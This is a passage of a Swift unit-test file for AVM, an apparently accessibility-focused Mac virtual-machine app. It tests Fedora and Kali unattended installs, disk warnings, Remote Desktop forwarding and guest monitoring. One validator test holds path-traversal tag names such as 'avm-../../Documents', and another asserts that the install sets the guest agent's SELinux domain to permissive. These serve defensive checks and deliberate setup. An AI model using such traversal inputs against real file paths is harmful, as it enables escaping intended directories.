    /// The answers go on the first entry only, that entry is the default,
    /// the menu boots by itself, and the installed-machine guard comes first.
    func testBootMenuEdit() throws {
        let edited = try XCTUnwrap(UbuntuInstallPipeline.editedFedoraBootMenu(menu))
        let arguments = UbuntuInstallPipeline.fedoraKernelArguments(volumeLabel: "Fedora-E-dvd-aarch64-44")
        XCTAssertTrue(edited.hasPrefix(UbuntuInstallPipeline.markerGuardLine))
        XCTAssertTrue(edited.contains("linux /images/pxeboot/vmlinuz \(arguments) inst.stage2=hd:LABEL=Fedora-E-dvd-aarch64-44 ro"))
        XCTAssertTrue(arguments.contains("inst.ks=hd:LABEL=Fedora-E-dvd-aarch64-44:/nocloud/ks.cfg"))
        XCTAssertTrue(edited.contains("set default=\"0\""))
        XCTAssertFalse(edited.contains("set default=\"1\""))
        XCTAssertTrue(edited.contains("set timeout=1\n"))
        XCTAssertEqual(edited.components(separatedBy: "inst.ks=").count, 2, "only the first entry")
        XCTAssertEqual(UbuntuInstallPipeline.fedoraVolumeLabel(inBootMenu: menu), "Fedora-E-dvd-aarch64-44")
        XCTAssertNil(UbuntuInstallPipeline.editedFedoraBootMenu("menuentry 'x' { linux /install.a64/vmlinuz }"))
        XCTAssertNil(UbuntuInstallPipeline.editedFedoraBootMenu("menuentry 'x' { linux /images/pxeboot/vmlinuz ro }"),
                     "no label to find the kickstart by")
    }

    /// Ubuntu's autoinstall installs the guest agent (2026-10-30): it
    /// didn't, so an installed Ubuntu never answered AVM through it.
    func testUbuntuInstallsTheGuestAgent() {
        let data = UbuntuInstallPipeline.userData(account: account, hostName: "h", timeZone: "UTC")
        for package in ["- spice-vdagent\n", "- spice-webdavd\n", "- qemu-guest-agent\n"] {
            XCTAssertTrue(data.contains(package), package)
        }
    }

    func testKickstartAnswersEverything() {
        let ks = UbuntuInstallPipeline.fedoraKickstart(account: account, hostName: "amenas-fedora",
                                                       timeZone: "America/Chicago", version: "44")
        for line in ["text\n", "lang en_US.UTF-8\n", "keyboard --xlayouts='gb (mac)'\n",
                     "timezone 'America/Chicago' --utc\n", "--hostname=amenas-fedora\n",
                     "mirrorlist?repo=fedora-44&arch=aarch64", "repo=updates-released-f44&arch=aarch64",
                     "ignoredisk --only-use=nvme0n1\n", "clearpart --all --initlabel --drives=nvme0n1\n",
                     "rootpw --lock\n",
                     "user --name=amena --gecos='Amena O'\"'\"'Neil' --groups=wheel --iscrypted --password='$6$salt$hash'\n",
                     "firstboot --disable\n", "\npoweroff\n",
                     "@^workstation-product-environment\n", "\norca\n", "\nspice-vdagent\n", "\nspice-webdavd\n",
                     "\nqemu-guest-agent\n", "\n-gnome-tour\n",
                     "%post --interpreter=/bin/bash --erroronfail --log=/root/avm-setup.log\n", "%onerror"] {
            XCTAssertTrue(ks.contains(line), line)
        }
        // Every section is closed, and nothing reboots into the installer.
        XCTAssertEqual(ks.components(separatedBy: "\n%end\n").count, 4)
        XCTAssertFalse(ks.contains("\nreboot"))
        // The release falls back to Anaconda's own when the disc didn't say.
        let unknown = UbuntuInstallPipeline.fedoraKickstart(account: account, hostName: "h", timeZone: "UTC", version: "")
        XCTAssertTrue(unknown.contains("repo=fedora-$releasever&"))
        // A US keyboard has no variant.
        var us = account
        us.keyboardLayout = nil
        us.keyboardVariant = nil
        XCTAssertTrue(UbuntuInstallPipeline.fedoraKickstart(account: us, hostName: "h", timeZone: "UTC", version: "44")
            .contains("keyboard --xlayouts='us'\n"))
    }

    /// Ubuntu's script, made Fedora's: every Ubuntu-only piece replaced,
    /// the marker still the last act.
    func testSetupScriptIsFedoras() throws {
        let script = UbuntuInstallPipeline.fedoraSetupScript(account: account)
        XCTAssertFalse(script.contains("curtin"))
        XCTAssertFalse(script.contains("/target"))
        XCTAssertFalse(script.contains("gdm3"))
        XCTAssertFalse(script.contains("update-grub"))
        XCTAssertFalse(script.contains("> $T/etc/dconf/profile/user"), "Fedora's own dconf profile is kept")
        XCTAssertTrue(script.contains("\nT=\n"))
        XCTAssertTrue(script.contains("\ndconf update\n"))
        XCTAssertTrue(script.contains("/etc/gdm/custom.conf"))
        XCTAssertTrue(script.contains("screen-reader-enabled=true"))
        XCTAssertTrue(script.contains("keyboard-layout='laptop'"))
        XCTAssertTrue(script.contains("grubby --update-kernel=ALL"))
        let restore = try XCTUnwrap(script.range(of: "restorecon -R /etc /home/$U"))
        let marker = try XCTUnwrap(script.range(of: "AVMDONE.TAG"))
        XCTAssertLessThan(restore.lowerBound, marker.lowerBound, "SELinux labels before the marker")
        let permissive = try XCTUnwrap(script.range(of: "(typepermissive virt_qemu_ga_t)\\n' > /tmp/avm-qemu-ga.cil"))
        XCTAssertLessThan(permissive.lowerBound, marker.lowerBound, "the guest agent unconfined before the marker")
        XCTAssertTrue(script.contains("semodule -i /tmp/avm-qemu-ga.cil ||"), "a failed semodule doesn't fail the install")
        XCTAssertTrue(script.contains("Fedora installed by AVM"))
        // Nothing in it could end the kickstart's %post early.
        XCTAssertFalse(script.components(separatedBy: "\n").contains("%end"))
    }

    func testFailureScriptWritesTheFailureMarker() {
        let script = UbuntuInstallPipeline.fedoraFailureScript
        XCTAssertTrue(script.contains("AVMFAIL.TAG"))
        XCTAssertTrue(script.contains("/tmp/anaconda.log"))
        XCTAssertTrue(script.contains("poweroff"))
        XCTAssertFalse(script.contains("AVMDONE"))
    }

    // MARK: Identifying the disc

    func testVolumeIDFromXorrisoReport() {
        let report = """
            Media summary: 1 session, 609220 data blocks, 1190m data, 1104g free
            Volume id    : 'Fedora-E-dvd-aarch64-44'
            xorriso : WARNING : Not found in ISO image: '/LiveOS'
            """
        XCTAssertEqual(UbuntuInstallPipeline.fedoraVolumeID(inXorrisoReport: report), "Fedora-E-dvd-aarch64-44")
        XCTAssertNil(UbuntuInstallPipeline.fedoraVolumeID(inXorrisoReport: "Media summary: blank"))
    }

    func testEverythingNetinstallIsAccepted() {
        let info = UbuntuInstallPipeline.fedoraISOInfo(volumeID: "Fedora-E-dvd-aarch64-44",
                                                       discInfo: "1776864364.781600\n44\naarch64\n",
                                                       hasInstallerKernel: true)
        XCTAssertEqual(info.distro, .fedora)
        XCTAssertEqual(info.version, "44")
        XCTAssertTrue(info.isARM64)
        XCTAssertFalse(info.isLiveImage)
        XCTAssertEqual(info.spokenName, "Fedora 44")
        XCTAssertNil(UbuntuInstallPipeline.problem(with: info))
    }

    func testWhatIsRefused() throws {
        let intel = UbuntuInstallPipeline.fedoraISOInfo(volumeID: "Fedora-E-dvd-x86_64-44",
                                                        discInfo: "1\n44\nx86_64\n", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: intel)).contains("aarch64"))

        let live = UbuntuInstallPipeline.fedoraISOInfo(volumeID: "Fedora-WS-Live-44", discInfo: "",
                                                       hasInstallerKernel: false)
        XCTAssertTrue(live.isLiveImage)
        XCTAssertEqual(live.version, "44")
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: live)).contains("live image"))

        let old = UbuntuInstallPipeline.fedoraISOInfo(volumeID: "Fedora-E-dvd-aarch64-43",
                                                      discInfo: "1\n43\naarch64\n", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: old)).contains("Fedora 44 or later"))

        let rawhide = UbuntuInstallPipeline.fedoraISOInfo(volumeID: "Fedora-E-dvd-aarch64-rawh",
                                                          discInfo: "1\nRawhide\naarch64\n", hasInstallerKernel: true)
        XCTAssertTrue(try XCTUnwrap(UbuntuInstallPipeline.problem(with: rawhide)).contains("couldn't tell"))
    }

    func testFedoraIsLinux() {
        XCTAssertTrue(GuestOS.fedora.isLinux)
        XCTAssertEqual(GuestOS(rawValue: "fedora"), .fedora)
        XCTAssertEqual(GuestOS.fedora.displayName, "Fedora")
    }

    func testFedoraUserNamesAreReserved() {
        XCTAssertNotNil(UbuntuAccount.problem(withUserName: "chrony"))
        XCTAssertNotNil(UbuntuAccount.problem(withUserName: "pipewire"))
        XCTAssertNil(UbuntuAccount.problem(withUserName: "amena"))
    }
}

// MARK: - The virtio disk (2026-10-27)

final class VirtioDiskTests: XCTestCase {
    private let account = UbuntuAccount(realName: "Amena", userName: "amena", passwordHash: "$6$salt$hash", signInAutomatically: true)

    func testOlderMachinesStayOnNVMe() {
        let older = VMConfiguration()
        XCTAssertFalse(older.usesVirtioDisk, "machines made before the virtio disk keep NVMe")
        XCTAssertNil(older.diskBusSwitch)
        var newer = VMConfiguration()
        newer.diskBus = "virtio"
        XCTAssertTrue(newer.usesVirtioDisk)
    }

    func testLinuxAnswersNameTheVirtioDisk() {
        let preseed = UbuntuInstallPipeline.debianPreseed(account: account, hostName: "h", timeZone: "UTC", disk: "vda")
        XCTAssertTrue(preseed.contains("d-i partman-auto/disk string /dev/vda"))
        XCTAssertFalse(preseed.contains("nvme0n1"))
        let ks = UbuntuInstallPipeline.fedoraKickstart(account: account, hostName: "h", timeZone: "UTC", version: "44", disk: "vda")
        XCTAssertTrue(ks.contains("ignoredisk --only-use=vda"))
        XCTAssertTrue(ks.contains("clearpart --all --initlabel --drives=vda"))
    }

    /// Setup numbers the virtio disk 1 (its driver loads after the USB
    /// answer-file disk), so the template's disk number is filled in.
    func testTheAnswerFileLeavesTheDiskNumberToAVM() throws {
        let url = URL(fileURLWithPath: #filePath).deletingLastPathComponent()
            .appendingPathComponent("../../Resources/autounattend.xml").standardizedFileURL
        let text = try String(contentsOf: url, encoding: .utf8)
        XCTAssertEqual(text.components(separatedBy: "<DiskID>AVM_DISK_ID</DiskID>").count - 1, 2)
        XCTAssertFalse(text.contains("<DiskID>0</DiskID>"))
        XCTAssertTrue(text.contains(#"<Path>X:\AVM\viostor</Path>"#))
    }
}

// MARK: - Setup's drives (2026-10-29)

final class SetupDrivesTests: XCTestCase {
    /// A snapshot carries on with the UNATTEND drive as it was taken: one
    /// taken with it out is noted, and one not noted had it in.
    func testSnapshotsKeepTheDrivesTheyWereTakenWith() throws {
        let fm = FileManager.default
        let dir = fm.temporaryDirectory.appendingPathComponent("avm-setup-drives-\(UUID().uuidString)", isDirectory: true)
        try fm.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: dir) }
        let point = "avm-1793192125958"
        XCTAssertFalse(QEMUSavedState.unattendWasOut(tag: QEMUSavedState.tag, in: dir), "a snapshot from before the note had the drive in")
        QEMUSavedState.setUnattendOut(true, tag: QEMUSavedState.tag, in: dir)
        QEMUSavedState.setUnattendOut(true, tag: point, in: dir)
        XCTAssertTrue(QEMUSavedState.unattendWasOut(tag: QEMUSavedState.tag, in: dir))
        XCTAssertTrue(QEMUSavedState.unattendWasOut(tag: point, in: dir))
        // Saved again with the drive in: an old state carried on, then saved
        // before the drive came out.
        QEMUSavedState.setUnattendOut(false, tag: QEMUSavedState.tag, in: dir)
        XCTAssertFalse(QEMUSavedState.unattendWasOut(tag: QEMUSavedState.tag, in: dir))
        XCTAssertTrue(QEMUSavedState.unattendWasOut(tag: point, in: dir))
        QEMUSavedState.setUnattendOut(false, tag: point, in: dir)
        XCTAssertFalse(fm.fileExists(atPath: dir.appendingPathComponent(QEMUSavedState.unattendOutFile).path), "an empty note is removed")
    }
}

// MARK: - Disk space (2026-10-27)

final class DiskWatchTests: XCTestCase {
    private let gb = DiskWatch.gigabyte

    func testTheMacsDiskIsSpokenOnceAtEachThreshold() {
        var last: Int64?
        var spoken: [Int64] = []
        for free in [30, 19, 18, 12, 9, 9, 4, 3].map({ Int64($0) * gb }) {
            let result = DiskWatch.hostWarning(free: free, lastSpoken: last)
            last = result.lastSpoken
            if let s = result.speak { spoken.append(s / gb) }
        }
        XCTAssertEqual(spoken, [20, 10, 5])
        // Plenty free again: it starts over.
        XCTAssertNil(DiskWatch.hostWarning(free: 30 * gb, lastSpoken: 5 * gb).lastSpoken)
        XCTAssertEqual(DiskWatch.hostWarning(free: 19 * gb, lastSpoken: nil).speak, 20 * gb)
        // Straight past two thresholds: the smaller one is said.
        XCTAssertEqual(DiskWatch.hostWarning(free: 8 * gb, lastSpoken: nil).speak, 10 * gb)
    }

    func testDrivesFromTheGuestAgent() {
        let windows: [[String: Any]] = [
            ["mountpoint": "C:\\", "type": "NTFS", "total-bytes": 64 * gb, "used-bytes": 60 * gb],
            ["mountpoint": "D:\\", "type": "CDFS", "total-bytes": 5 * gb, "used-bytes": 5 * gb],
            ["mountpoint": "E:\\", "type": "FAT", "total-bytes": 8_388_608, "used-bytes": 1_000],
        ]
        XCTAssertEqual(DiskWatch.drives(fromFsinfo: windows), [DiskWatch.Drive(name: "C:", used: 60 * gb, total: 64 * gb)])
        let linux: [[String: Any]] = [
            ["mountpoint": "/", "type": "ext4", "total-bytes": 60 * gb, "used-bytes": 10 * gb],
            ["mountpoint": "/boot/efi", "type": "vfat", "total-bytes": 2 * gb, "used-bytes": 1 * gb],
        ]
        XCTAssertEqual(DiskWatch.drives(fromFsinfo: linux).map(\.name), ["/"])
    }

    func testAGuestDriveIsSpokenOnceUntilItFrees() {
        let full = DiskWatch.Drive(name: "C:", used: 59 * gb, total: 64 * gb)
        var result = DiskWatch.guestWarnings([full], spoken: [])
        XCTAssertEqual(result.speak.map(\.name), ["C:"])
        result = DiskWatch.guestWarnings([full], spoken: result.spoken)
        XCTAssertTrue(result.speak.isEmpty, "said once")
        let freed = DiskWatch.Drive(name: "C:", used: 50 * gb, total: 64 * gb)
        result = DiskWatch.guestWarnings([freed], spoken: result.spoken)
        XCTAssertTrue(result.spoken.isEmpty, "below 85% it may warn again")
        XCTAssertTrue(DiskWatch.guestWords(machine: "Work PC", drive: full).hasPrefix("Work PC's C: drive is 92 percent full, with 5 gigabytes left."))
    }
}

// MARK: - 3D graphics (2026-10-27)

final class Graphics3DTests: XCTestCase {
    func testOnlyLinuxMachinesDrawIn3D() {
        var linux = VMConfiguration(guestOSName: "debian")
        XCTAssertFalse(linux.uses3D, "off unless chosen")
        linux.gpu3D = true
        XCTAssertTrue(linux.uses3D)
        var windows = VMConfiguration()
        windows.gpu3D = true
        XCTAssertFalse(windows.uses3D, "Windows has no virgl driver")
    }
}

// MARK: - Remote Desktop (2026-10-28, RemoteDesktopAddress.swift)

final class RemoteDesktopTests: XCTestCase {
    private func machine(_ name: String, user: String? = nil, port: Int? = nil, reach: String? = nil) -> VMConfiguration {
        var config = VMConfiguration(name: name)
        config.remoteDesktopUser = user
        config.remoteDesktopPort = port
        config.remoteDesktopReach = reach
        return config
    }

    func testTheFirstMachineGetsTheStandardPort() {
        let a = machine("Work PC", user: "me")
        XCTAssertEqual(RemoteDesktop.port(for: a, among: [a]), 3389)
    }

    func testTheNextMachineGetsTheNextFreePort() {
        let a = machine("Work PC", user: "me", port: 3389)
        let b = machine("Games", user: "me", port: 3390)
        let c = machine("Debian", user: "me")
        XCTAssertEqual(RemoteDesktop.port(for: c, among: [a, b, c]), 3391)
        XCTAssertEqual(RemoteDesktop.port(for: a, among: [a, b, c]), 3389, "a port is kept once chosen")
    }

    func testAMachineWithRemoteDesktopOffHoldsNoPort() {
        var off = machine("Old", port: 3389)
        off.remoteDesktopUser = nil
        let new = machine("New", user: "me")
        XCTAssertEqual(RemoteDesktop.port(for: new, among: [off, new]), 3389)
    }

    func testTheNameIsAHostName() {
        XCTAssertEqual(RemoteDesktop.hostLabel(for: machine("Amena-PC")), "amena-pc")
        XCTAssertEqual(RemoteDesktop.hostLabel(for: machine("Windows 11 test 2")), "windows-11-test-2")
        XCTAssertEqual(RemoteDesktop.hostLabel(for: machine("Café français!")), "cafe-francais")
        XCTAssertEqual(RemoteDesktop.hostLabel(for: machine("日本語")), "avm-machine")
        XCTAssertEqual(RemoteDesktop.hostLabel(for: machine("--odd--")), "odd")
    }

    func testTheForwardingRuleBindsWhereChosen() {
        XCTAssertEqual(RemoteDesktop.forwardingRule(for: machine("A", user: "me"), port: 3389), "tcp:127.0.0.1:3389-:3389")
        XCTAssertEqual(RemoteDesktop.forwardingRule(for: machine("A", user: "me", reach: "network"), port: 3390), "tcp:0.0.0.0:3390-:3389")
    }

    func testTheAddressesToType() {
        let first = RemoteDesktop.addresses(for: machine("Amena-PC", user: "me"), port: 3389)
        XCTAssertEqual(first.name, "amena-pc.local")
        XCTAssertEqual(first.ip, "127.0.0.1")
        let second = RemoteDesktop.addresses(for: machine("Games", user: "me"), port: 3390)
        XCTAssertEqual(second.name, "games.local:3390")
        XCTAssertEqual(second.ip, "127.0.0.1:3390")
        let onTheNetwork = RemoteDesktop.addresses(for: machine("Games", user: "me", reach: "network"), port: 3390)
        XCTAssertTrue(onTheNetwork.ip.hasSuffix(":3390"))
        XCTAssertFalse(onTheNetwork.ip.hasPrefix("127."), "a machine on the network is given the Mac's address")
    }

    func testOnAndOff() {
        XCTAssertFalse(machine("A").remoteDesktopOn)
        XCTAssertFalse(machine("A", user: "").remoteDesktopOn)
        XCTAssertTrue(machine("A", user: "me").remoteDesktopOn)
        XCTAssertTrue(machine("A", user: "me", reach: "network").remoteDesktopReachesNetwork)
        XCTAssertFalse(machine("A", user: "me").remoteDesktopReachesNetwork)
    }
}

// MARK: - Sixth audit (2026-10-29)

/// A machine list with a number, string or null in it used to crash AVM at
/// every launch: JSONSerialization raised an exception try? can't catch.
final class MachineListEntryTests: XCTestCase {
    func testEntriesThatAreNotObjectsAreKeptNotDecoded() {
        let data = Data(#"[1, "two", null, true, [3]]"#.utf8)
        let readable = VMStore.readableEntries(in: data)
        XCTAssertNotNil(readable)
        XCTAssertEqual(readable?.machines.count, 0)
        XCTAssertEqual(readable?.unreadable, 5)
        XCTAssertEqual(readable?.kept.count, 5)
    }

    func testAnObjectThatIsNotAMachineIsKept() {
        let readable = VMStore.readableEntries(in: Data(#"[{"hello": "world"}]"#.utf8))
        XCTAssertEqual(readable?.machines.count, 0)
        XCTAssertEqual(readable?.unreadable, 1)
    }
}

/// Windows Setup can't make an account named like one of its own groups,
/// and counts a name's length in UTF-16 units.
final class WindowsAccountNameTests: XCTestCase {
    func testBuiltInGroupNamesAreRefused() {
        for name in ["Guests", "Replicator", "IIS_IUSRS", "Remote Desktop Users"] {
            XCTAssertNotNil(WindowsSetupAnswers.problem(withUserName: name, computerName: nil), name)
        }
        XCTAssertNil(WindowsSetupAnswers.problem(withUserName: "Amena", computerName: nil))
    }

    func testLengthIsCountedAsWindowsCountsIt() {
        // 10 emoji are 10 characters but 20 UTF-16 units: allowed. 11 aren't.
        XCTAssertNil(WindowsSetupAnswers.problem(withUserName: String(repeating: "😀", count: 10), computerName: nil))
        XCTAssertNotNil(WindowsSetupAnswers.problem(withUserName: String(repeating: "😀", count: 11), computerName: nil))
    }
}

/// A machine kept on an external drive is told about that drive's space,
/// not the Mac's.
final class DiskWatchDriveWordsTests: XCTestCase {
    func testDriveIsNamed() {
        let words = DiskWatch.hostWords(machine: "Windows", free: 8 * DiskWatch.gigabyte, drive: "Backup")
        XCTAssertTrue(words.contains("The drive Backup has 8 gigabytes free"))
        XCTAssertTrue(words.contains("free some space on Backup"))
        XCTAssertFalse(words.contains("Your Mac"))
    }

    func testTheMacsOwnDiskIsUnchanged() {
        XCTAssertTrue(DiskWatch.hostWords(machine: "Windows", free: 8 * DiskWatch.gigabyte).hasPrefix("Your Mac has 8 gigabytes free"))
    }
}

/// A package's numbers and names are anyone's, and a restore point's
/// snapshot name is any bytes (2026-10-29, sixth audit).
final class ImportedValuesTests: XCTestCase {
    func testOnlyAVMsOwnRestorePointTagsAreUsed() {
        XCTAssertTrue(RestorePoints.isOwnTag(RestorePoints.newTag()))
        XCTAssertTrue(RestorePoints.isOwnTag("avm-1730000000000"))
        XCTAssertFalse(RestorePoints.isOwnTag("avm-"))
        XCTAssertFalse(RestorePoints.isOwnTag("avm-../../Documents"))
        XCTAssertFalse(RestorePoints.isOwnTag("avm-1/../x"))
        XCTAssertFalse(RestorePoints.isOwnTag("saved-state"))
    }

    func testNumbersAreKeptInRangeAndTheNameIsSayable() {
        var original = VMConfiguration(name: "Bad\nname\u{7}")
        original.ramSizeGB = -8
        original.cpuCount = -2
        original.diskSizeGB = -100
        let folder = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        let imported = MachineArchive.importedConfiguration(original, id: UUID(), folder: folder, existingNames: [])
        XCTAssertGreaterThanOrEqual(imported.ramSizeGB, 1)
        XCTAssertGreaterThanOrEqual(imported.cpuCount, 1)
        XCTAssertGreaterThanOrEqual(imported.diskSizeGB, 1)
        XCTAssertEqual(imported.name, "Badname")
    }
}

/// What's running in a machine, and what's new on its screen
/// (2026-10-31, GuestWatchLogic.swift).
final class GuestWatchTests: XCTestCase {
    func testWindowsProcessListFindsScreenReadersAndSignIn() {
        let listing = """
        "System Idle Process","0","Services","0","8 K"
        "explorer.exe","4120","Console","1","98,000 K"
        "nvda.exe","5100","Console","1","60,000 K"
        "NVDA_slave.exe","5120","Console","1","9,000 K"
        """
        let found = GuestProcesses.parse(listing, windows: true)
        XCTAssertTrue(found.signedIn)
        XCTAssertEqual(found.screenReaders, ["NVDA"])
        XCTAssertFalse(GuestProcesses.parse(#""winlogon.exe","600","Console","1","5 K""#, windows: true).signedIn)
    }

    func testLinuxProcessListFindsOrcaAndGnome() {
        let found = GuestProcesses.parse("COMMAND\nsystemd\ngnome-shell\norca\n", windows: false)
        XCTAssertTrue(found.signedIn)
        XCTAssertTrue(found.gnome)
        XCTAssertEqual(found.screenReaders, ["Orca"])
        XCTAssertFalse(GuestProcesses.parse("COMMAND\nsystemd\ngdm\n", windows: false).signedIn)
    }

    func testABootIsKnownByItsFirstProcess() {
        let windows = [#""System Idle Process","0","Services","0","8 K""#,
                       #""smss.exe","412","Services","0","1,232 K""#,
                       #""nvda.exe","5120","Console","1","50,000 K""#].joined(separator: "\n")
        XCTAssertEqual(GuestProcesses.parse(windows, windows: true).boot, "412")
        XCTAssertEqual(GuestProcesses.parse(windows, windows: true).screenReaders, ["NVDA"])
        let linux = "6f0c1a52-58a3-4c1e-9e9a-2b7d1c0e4f11\nCOMMAND\nsystemd\norca\n"
        XCTAssertEqual(GuestProcesses.parse(linux, windows: false).boot, "6f0c1a52-58a3-4c1e-9e9a-2b7d1c0e4f11")
        XCTAssertEqual(GuestProcesses.parse(linux, windows: false).screenReaders, ["Orca"])
        XCTAssertNil(GuestProcesses.parse("COMMAND\nsystemd\n", windows: false).boot)
    }

    func testCountersAndRepeatsAreSaidOnce() {
        let said = Set(["Working on updates 23%"].map(ScreenChange.key))
        XCTAssertEqual(ScreenChange.newLines(["Working on updates 24%", "Don't turn off your computer", "5", "Don't turn off your computer"], after: said),
                       ["Don't turn off your computer"])
    }

    func testStopScreenIsRecognised() {
        XCTAssertTrue(ScreenChange.isStopScreen(["Your device ran into a problem and needs to restart.", "Stop code: CRITICAL_PROCESS_DIED"]))
        XCTAssertFalse(ScreenChange.isStopScreen(["Your device ran into a problem"]))
    }

    func testASpinnerIsNotANewScreen() {
        var a = [UInt8](repeating: 10, count: 64 * 36)
        var b = a
        for i in 0..<20 { b[i] = 200 }
        XCTAssertFalse(ScreenChange.isNewScreen(a, b))
        for i in 0..<(64 * 36 / 2) { a[i] = 220 }
        XCTAssertTrue(ScreenChange.isNewScreen(a, b))
    }

    func testWatchingIsOnUnlessTurnedOff() {
        let key = "AVMTest-\(UUID().uuidString)"
        XCTAssertTrue(GuestWatchSettings.isOn(key))
        UserDefaults.standard.set(false, forKey: key)
        XCTAssertFalse(GuestWatchSettings.isOn(key))
        UserDefaults.standard.removeObject(forKey: key)
        XCTAssertFalse(GuestWatchSettings.isOn(GuestWatchSettings.pointBeforeUpdatesKey) && UserDefaults.standard.object(forKey: GuestWatchSettings.pointBeforeUpdatesKey) == nil,
                       "the point before updates is off until turned on")
    }
}

// MARK: - Kali Linux, Debian's way (2026-10-30)

final class KaliInstallTests: XCTestCase {
    private let account = UbuntuAccount(realName: "Amena T", userName: "amena", passwordHash: "$6$salt$hash",
                                        signInAutomatically: true, keyboardLayout: "gb", keyboardVariant: "mac")

    /// The first two entries of kali-linux-2026.3-installer-netinst-arm64.iso's
    /// menu, as they are on the disc.
    private let menu = """
        menuentry 'Install' {
            set background_color=black
            linux    /install.a64/vmlinuz net.ifnames=0 console=tty0 preseed/file=/cdrom/simple-cdd/default.preseed simple-cdd/profiles=kali --- quiet
            initrd   /install.a64/initrd.gz
        }
        menuentry 'Graphical install' {
            set background_color=black
            linux    /install.a64/vmlinuz net.ifnames=0 console=tty0 preseed/file=/cdrom/simple-cdd/default.preseed simple-cdd/profiles=kali --- quiet
            initrd   /install.a64/gtk/initrd.gz
        }
        """

    /// AVM's preseed takes the place of Kali's on the entry that boots,
    /// and only there; Kali's profile and the GNOME choice stay.
    func testBootMenuEdit() throws {
        let edited = try XCTUnwrap(UbuntuInstallPipeline.editedKaliBootMenu(menu, keyboard: "keymap=gb"))
        XCTAssertTrue(edited.hasPrefix(UbuntuInstallPipeline.markerGuardLine))
        let first = try XCTUnwrap(edited.components(separatedBy: "\n").first { $0.contains("/install.a64/vmlinuz") })
        XCTAssertTrue(first.contains("\(UbuntuInstallPipeline.debianKernelArguments) keymap=gb desktop=gnome"))
        XCTAssertFalse(first.contains(UbuntuInstallPipeline.kaliOwnPreseedArgument))
        XCTAssertTrue(first.contains("simple-cdd/profiles=kali"))
        XCTAssertEqual(edited.components(separatedBy: "preseed/file=").count, 3, "the second entry is untouched")
        XCTAssertTrue(edited.contains("set timeout=1"))
        // Debian's own menu has no Kali profile: not Kali's.
        XCTAssertNil(UbuntuInstallPipeline.editedKaliBootMenu("menuentry 'x' {\n linux /install.a64/vmlinuz --- quiet\n}"))
        XCTAssertNil(UbuntuInstallPipeline.editedKaliBootMenu("menuentry 'x' { linux /casper/vmlinuz }"))
    }

    func testPreseedIsKalis() {
        let preseed = UbuntuInstallPipeline.kaliPreseed(account: account, hostName: "amenas-kali", timeZone: "UTC", disk: "vda")
        for line in ["d-i preseed/early_command string anna-install simple-cdd-profiles\n",
                     "d-i mirror/http/hostname string http.kali.org\n", "d-i mirror/http/directory string /kali\n",
                     "d-i apt-setup/services-select multiselect\n",
                     "tasksel tasksel/first multiselect core, desktop-gnome, meta-default, standard\n",
                     "orca spice-vdagent qemu-guest-agent spice-webdavd", "d-i partman-auto/disk string /dev/vda\n",
                     "d-i passwd/username string amena\n", "d-i preseed/late_command string sh /cdrom/nocloud/setup.sh",
                     "d-i debian-installer/exit/poweroff boolean true\n"] {
            XCTAssertTrue(preseed.contains(line), line)
        }
        XCTAssertFalse(preseed.contains("deb.debian.org"))
        XCTAssertFalse(preseed.contains("gnome-desktop"))
    }

    func testSetupScriptIsKalis() throws {
        let script = UbuntuInstallPipeline.kaliSetupScript(account: account)
        XCTAssertTrue(script.hasPrefix("#!/bin/sh"))
        XCTAssertTrue(script.contains("Kali Linux installed by AVM"))
        XCTAssertTrue(script.contains("/etc/gdm3/daemon.conf"))
        XCTAssertTrue(script.contains(#"XKBLAYOUT="gb""#))
        // Kali's own dconf profile is added to, not written over.
        XCTAssertTrue(script.contains("grep -qx 'system-db:local' $T/etc/dconf/profile/user ||"))
        let profile = try XCTUnwrap(script.range(of: "system-db:local"))
        let update = try XCTUnwrap(script.range(of: "in-target dconf update"))
        XCTAssertLessThan(profile.lowerBound, update.lowerBound)
        XCTAssertTrue(UbuntuInstallPipeline.kaliFailureScript.contains("Kali Linux install failed"))
        XCTAssertTrue(UbuntuInstallPipeline.kaliFailureScript.contains("AVMFAIL.TAG"))
    }

    func testKaliDiscIsKnown() {
        XCTAssertEqual(UbuntuInstallPipeline.debianFamily(
            discInfo: "Kali GNU/Linux 2026.3rc2 \"Kali-last-snapshot\" - Official arm64 NETINST with firmware 20261009-17:19"), .kali)
        XCTAssertEqual(UbuntuInstallPipeline.debianFamily(discInfo: "Debian GNU/Linux 13.7.0 \"Trixie\" - Official arm64 NETINST"), .debian)
        let kali = UbuntuISOInfo(discInfo: "Kali GNU/Linux 2026.3", version: "2026.3", isARM64: true, isDesktop: true, distro: .kali)
        XCTAssertEqual(kali.spokenName, "Kali Linux 2026.3")
        XCTAssertNil(UbuntuInstallPipeline.problem(with: kali))
        let intel = UbuntuISOInfo(discInfo: "Kali", version: "2026.3", isARM64: false, isDesktop: true, distro: .kali)
        XCTAssertTrue(UbuntuInstallPipeline.problem(with: intel)?.contains("arm64") ?? false)
        XCTAssertTrue(LinuxDistro.kali.usesPreseed)
        XCTAssertTrue(GuestOS.kali.isLinux)
        XCTAssertEqual(GuestOS(rawValue: "kali")?.displayName, "Kali Linux")
        XCTAssertNotNil(UbuntuAccount.problem(withUserName: "postgres"), "a Kali tool's own user")
    }
}

// MARK: - Download Linux: finding the file and its checksum (2026-10-30)

final class LinuxDownloadTests: XCTestCase {
    private func newest(_ distribution: LinuxISODownloader.Distribution, in listing: String) -> String? {
        LinuxISODownloader.matches(distribution.filePattern, in: listing)
            .max(by: { $0.compare($1, options: .numeric) == .orderedAscending })
    }

    /// cdimage.kali.org/current/ lists every kind of image; only the arm64
    /// netinstaller is wanted, and its checksum, not its .torrent's.
    func testKali() throws {
        let listing = """
            <a href="kali-linux-2026.3-installer-amd64.iso">x</a>
            <a href="kali-linux-2026.3-installer-arm64.iso">x</a>
            <a href="kali-linux-2026.3-installer-netinst-amd64.iso">x</a>
            <a href="kali-linux-2026.3-installer-netinst-arm64.iso">x</a>
            <a href="kali-linux-2026.3-installer-netinst-arm64.iso.torrent">x</a>
            <a href="kali-linux-2026.3-live-arm64.iso.torrent">x</a>
            <a href="SHA256SUMS">x</a> <a href="SHA256SUMS.gpg">x</a>
            """
        let name = try XCTUnwrap(newest(.kali, in: listing))
        XCTAssertEqual(name, "kali-linux-2026.3-installer-netinst-arm64.iso")
